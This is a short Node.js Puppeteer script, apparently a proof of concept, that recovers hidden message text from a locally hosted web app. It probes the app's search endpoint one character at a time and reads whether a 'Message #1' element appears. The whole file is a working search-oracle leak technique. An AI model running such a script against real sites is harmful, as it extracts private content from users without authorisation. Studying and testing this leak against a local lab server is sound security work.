const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch({headless: true});
  const page = await browser.newPage();
  await page.setViewport({height: 1080, width: 1920});
  var link = 'http://127.0.0.1:8000';

  await page.goto(link);
  
  var charsExcept = "BCDFHJKLOPQUVWXYZbdeghjklnoqsuvwxyz023456789 ";
  var chars = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ./-, ";
  var isSolved1 = false;
  var actualWord = '';
  var numberOfSteps = 0;

  // checking the first letter 
  while (!isSolved1) {
    numberOfSteps++;
    var randomChar = getRandomCharExpect();
    await page.goto(`${link}/search?string=${actualWord+randomChar}`);
    if (await checkString('Message #1', page) == true) {
      isSolved1 = true;
      actualWord = actualWord+randomChar;
      console.log(`found a new letter [ ${randomChar} ] the word now is [ ${actualWord} ]`);
    }
  }

  // going forward
  for(var i = 0; i < chars.length; i++) {
    numberOfSteps++;
    await page.goto(`${link}/search?string=${actualWord+chars.charAt(i)}`);
    if (await checkString('Message #1', page)) {
      if(chars.charAt(i) == ' ') {
        if (actualWord.charAt(actualWord.length-1) == ' ') {
          break;
        }
      }
      actualWord = actualWord+chars.charAt(i);
      console.log(`found a new letter [ ${chars.charAt(i)} ] the word now is [ ${actualWord} ]`);
      i = -1;
    }
  }

  // going backwards
  for(var i = 0; i < chars.length; i++) {
    numberOfSteps++;
    await page.goto(`${link}/search?string=${chars.charAt(i)+actualWord}`);
    if (await checkString('Message #1', page)) {
      if(chars.charAt(i) == ' ') {
        if (actualWord.charAt(0) == ' ') {
          break;
        }
      }
      actualWord = chars.charAt(i)+actualWord;
      console.log(`found a new letter [ ${chars.charAt(i)} ] the word now is [ ${actualWord} ]`);
      i = -1;
    }
  }


  console.log(`FOUND IT, THE CONTENT IS [ ${actualWord} ], IT TOOK ${numberOfSteps} STEPS TO FIND IT`)
  await page.screenshot({path: 'files/test.png'});
  await page.close()
  await browser.close();
})();

async function checkString(string, page) {
  var result = await page.evaluate((string) => {
    if (document.getElementById(string) == null) {
      return false;
    } else {
      return true;
    }
  }, string);
  return result;
}

function getRandomNumberUntil(number) {
  Math.floor(Math.random() * (number-1));
}

function getRandomCharExpect() {
  var text = "";
  var possible = "BCDFHJKLOPQUVWXYZbdehjklnoqsuvwxyz023456789";
  text += possible.charAt(Math.floor(Math.random() * possible.length));
  return text;
}